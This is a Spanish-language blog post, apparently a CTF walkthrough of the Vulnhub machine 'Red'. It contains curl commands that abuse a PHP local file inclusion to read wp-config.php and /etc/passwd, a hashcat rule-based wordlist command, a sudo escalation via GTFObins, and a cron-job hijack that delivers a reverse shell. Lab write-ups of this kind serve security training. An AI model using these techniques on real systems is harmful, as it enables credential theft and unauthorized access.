---
layout: post
title: "RED - Vulnhub Machine"
date: 2024-03-14 11:57 -0600
categories: CTF
tags: Vulnhub Writeup
image:
    path: /assets/img/headers/banner-red.webp
    alt: Máquina Red de Vulnhub
---

Holaa!, en esta ocasión vamos a resolver otra máquina linux de vulnhub, como siempre hay que agradecer a [hadrian3689](https://readysetexploit.gitlab.io/home/) por proveer estos alimentos del día de hoy. 

Esta máquina tiene una premisa algo peculiar.

![](/assets/img/posts/20240312.png)

Al parecer, alguien llamado **Red**, ha tomado prestado el servidor, cosa que tenemos que recuperar el control, así que comencemos.

![](/assets/img/posts/WzwQ5W.gif)

Lo siento, Escaneo de puertos y ya.
 
![](/assets/img/posts/20240312-3.png)

Adelantándome para observar la web, se miraba sin estilos, así que miré el código fuente de la web. Me percaté que hace alusión a un dominio, así que lo declaré en `/etc/hosts`.

![](/assets/img/posts/20240312-4.png)

![](/assets/img/posts/20240312-6.png)

Y bueno, como buen maleante educado y juguetón, el mismo nos indica que ha escondido un supuesto backdoor, así que confiaremos en el "Nunca lo hagas". Vamos a buscar el dichoso backdoor con algunas listas de [seclists](https://github.com/danielmiessler/SecLists). Intenté con dos lista:

- `seclist/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt`
- `seclist/Web-Shells/backdoor_list.txt`

![](/assets/img/posts/20240313.png)

Ajaaa, ya tenemos algunos archivos sospechosos, intuyo que este archivo debe de recibir algún parámetro para ejecutar algún comando o algo así. Así que con otra lista de parámetros comunes que he encontrado en [Github](https://github.com/whiteknight7/wordlist/blob/main/fuzz-lfi-params-list.txt), voy a aplicar un fuzz en los dos archivos. Aunque ya os adelanto que `NetworkFIleManagerPHP.php` es el bueno.

![](/assets/img/posts/20240313-1.png)
![](/assets/img/posts/20240313-2.png)

Key es el parámetro, aparentemente me dirigí a la página esperando ejecutar comandos directamente.

![](/assets/img/posts/20240313-3.png)

Pero claramente no obtuve una respuesta, así que pensé en algún LFI, algo raro para mis gustos.

![](/assets/img/posts/20240313-4.png)

Pero funcionó, sabiendo esto busqué algo que me diera entrada a un [RCE](https://deephacking.tech/local-file-inclusion-lfi-pentesting-web) pero sin éxito. Así que me dio por husmear el presunto backdoor que estaba haciendo uso.

Pero al ser un archivo `.php` este sería automáticamente interpretado por la web, es decir, que no me lo iba a mostrar, así que por medio de un [wrapper](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter) lo codifique a base64.

![](/assets/img/posts/20240313-6.png)

Así que lo descargué para el análisis minucioso de este backdoor.

```shell
curl 'http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=NetworkFileManagerPHP.php' | base64 -d > NetworkFileManagerPHP.php
```

```php
<?php
   $file = $_GET['key'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("NetworkFileManagerPHP.php");
   }
   /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */
?>
```

Todo parece normal hasta que ves comentada la tremenda cadena en base64, decodificamooos y.

*That password alone won't help you! Hashcat says rules are rules*

Y bueno, en lo absoluto entendí y por ahora la dejaré, así que pase a descargar otros archivos de wordpress como el de su configuración.

```shell
curl 'http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=wp-config.php' | base64 -d > wp-config.php
```

![](/assets/img/posts/20240313-7.png)

Tenemos una contraseña, pero para reutilizarla en algún otro servicio como ssh no funcionó. Aquí es donde tuve que recordar lo que tenía y que me pudiera servir de la info que hemos recopilado. Así que retome el comentario de mi amigo, **Red**.

*That password alone won't help you! Hashcat says rules are rules*

![](/assets/img/posts/20240313-8.png)

Hasta que...hashcat reglas son reglas? reglas...

![](/assets/img/posts/20240313-11.png) 

Ajaa, minuciosamente analicé la técnica...

![](/assets/img/posts/20240313-12.png)

Y llegué a una conclusión 😑...

Me hubiera encantado haber realizado esta pequeña investigación, pero mis dedos teclearon otra cosa y di primero con un [WriteUP](https://www.youtube.com/watch?v=Dcdzudcv5fc&t=2459s&pp=ygULcmVkIHZ1bG5odWI%3D). Aquí es donde me di cuenta de que existía algo como **Rule-based attack** con HashCat.

> Así que no olvides tomar agua y prestar atención a las pistas proporcionadas, que estamos en un CTF.

Dicho esto sabemos que tenemos que usar dicha técnica, así que ahí la tiene. Como tenemos que tener una contraseña de base, usaremos la única que tenemos.

```shell
hashcat --force pass-db.txt -r /usr/share/hashcat/rules/best64.rule --stdout > new_pass 
```

![](/assets/img/posts/20240313-13.png)

Hashcat nos dio un diccionario de palabras; ahora nos falta la de los usuarios, aunque ya tenemos a john, pero podemos tenerlos todos.

```shell
curl 'http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd' | grep sh | awk '{print $1}' FS=':' > users.txt
```

![](/assets/img/posts/20240313-14.png)

Y valla, estamos dentro, analizando los posibles casos para la escalada de privilegios, me enteré de ciertas cosas que no son de mi agrado y algo fastidiosas, cosas que son responsables de **Red**, ya que se tomó el tiempo de aplicar ciertas "Defensas" solo para fastidiar, ya que estando dentro podemos encontrar lo siguiente.

- Nos cierran la sesión de john y cambian la contraseña.
- Imprimen mensajes en la terminal.

Y ya no hay más, son solo dos, pero suficientes para que aplique su objetivo.

![](/assets/img/posts/20240313-17.png)

Continuando con la escalada de privilegios busqué ciertas cosas.

- Permisos en directorios `/`.
-  Archivos del usuario.
- Privilegios de sudo (Este es el bueno).

Ya que observando los permisos que tenía con sudo, miré esto.

![](/assets/img/posts/20240313-18.png)

Y para estos casos podemos abusar de este con la ayuda de [GTFObins](https://gtfobins.github.io/).

![](/assets/img/posts/20240313-19.png)

🤨?

![](/assets/img/posts/20240313-20.png)

Valla, ahora para evitar que nos quita la conexión, me enviaré una shell reversa desde el directorio `/dev/shm` que aquí mismo cree un archivo sh.

![](/assets/img/posts/20240313-21.png)

De tal manera que me hice de una shell donde el **Red** ya no pueda sacarme 🙂. Continuando con la escalada, busque en: 

- Archivos del usuario. 
- Privilegios de sudo. 
- Permisos en archivos. 
- Servicios web 🙂.

Dentro de la única aplicación web que es el directorio de wordpress está la carpeta `.git` no era el propietario, pero sí pertenece al grupo `ippsec`, raro no?

![](/assets/img/posts/20240313-22.png)

Y por supuesto que había algo raro ahí.

![](/assets/img/posts/20240313-23.png)

El archivo `rev` es un binario; al ejecutarlo pasa esto.

![](/assets/img/posts/20240313-26.png)

mmmm, veamos el otro archivo.

![](/assets/img/posts/20240313-27.png)

Interesante, ¿no crees? Anteriormente, les comentaba que el llamado **Red** está todo el tiempo spawneado mensajes en la terminal y este mensaje que imprime el binario `rev` ya lo había visto. Eso me hace pensar que hay una tarea cron ejecutando este binario.

Aunque este punto lo pude comprobar, observando los procesos con [pspy](https://github.com/DominicBreuker/pspy).

![](/assets/img/posts/20240313-28.png)

Hasta que en algún momento mire el usuario con `uid=0` compilo el archivo `supersecretfileuc.c` y ejecuto como `rev`.

![](/assets/img/posts/20240313-29.png)

¿Y qué podemos hacer ante esto? No tenemos permisos directamente al archivo en c, pero tenemos permisos por medio del grupo de la carpeta `.git`, lo que me otorga el control de la carpeta, es decir, puedo eliminar el archivo, remplazarlo con un código algo malicioso y que root lo compile y lo ejecute.

Así que obtuve el código de c para una shell reversa.
![](/assets/img/posts/20240313-33.png)

Guardé la shell y la alojé en mi máquina atacante, mediante un servicio web de python3.

![](/assets/img/posts/20240313-32.png)

Descargue la shell reversa, denle permisos de ejecución en la máquina víctima y lo mueve a la carpeta .git con el mismo nombre del anterior script, así root compilar y ejecutar el archivo sin preguntar.

![](/assets/img/posts/20240313-34.png)
![](/assets/img/posts/20240313-35.png)

No olvide ponerse en escucha para recibir su shell, hasta que en algún momento llega 🙂.

![](/assets/img/posts/20240313-36.png)

Podemos ver la flag y los scripts que "defendían" el server.

![](/assets/img/posts/20240313-37.png)

Gracias a mis maniobras defensivas y a mi maestra del kinder, logré reprimirlas para así podérselas mostrar sin que siga fastidiando.

![](/assets/img/posts/20240313-38.png)

Déjeme presentarle a los soldados caídos.

![backdoor.sh](/assets/img/posts/20240313-39.png)

![change_pass.sh](/assets/img/posts/20240313-40.png)

![kill_sess.sh](/assets/img/posts/20240313-42.png)

![talk.sh](/assets/img/posts/20240313-43.png)

Por el momento esto todo, espero que siga aprendiendo como nunca. Hasta luego!!

![](/assets/img/posts/20240313.gif)

---

**Referencias**

- [https://www.youtube.com/watch?v=Dcdzudcv5fc&pp=ygULcmVkIHZ1bG5odWI%3D](https://www.youtube.com/watch?v=Dcdzudcv5fc&pp=ygULcmVkIHZ1bG5odWI%3D)
- [https://saltacybersecurity.club/vulnhub-red/](https://saltacybersecurity.club/vulnhub-red/)
- [https://medium.com/@juden098/red-vulnhub-machine-walkthrough-ccd0620a3812](https://medium.com/@juden098/red-vulnhub-machine-walkthrough-ccd0620a3812)

- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
- [https://www.revshells.com/](https://www.revshells.com/)
- [https://github.com/whiteknight7](https://github.com/whiteknight7)
